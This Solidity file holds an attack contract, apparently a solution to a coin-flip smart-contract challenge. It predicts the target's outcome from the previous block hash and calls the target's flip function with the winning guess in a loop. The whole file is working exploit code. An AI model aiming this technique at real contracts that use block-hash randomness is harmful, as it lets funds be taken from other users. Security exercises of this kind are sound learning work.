// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface CoinFlip {
      function flip(bool _guess) external returns (bool);
}

contract hackCoinFlip {
    CoinFlip public originalContract = CoinFlip(0x5cB5EE5998CE3889433d19bfd4c5122C40327b7d); 
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public {
        for (uint i = 0; i < 9; ++i) {
            hackFlip(true);
        }
    }

    function hackFlip(bool _guess) public {
        // pre-deteremine the flip outcome
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // If I guessed correctly, submit my guess
        if (side == _guess) {
            originalContract.flip(_guess);
        } else {
        // If I guess incorrectly, submit the opposite
            originalContract.flip(!_guess);
        }
    }
}
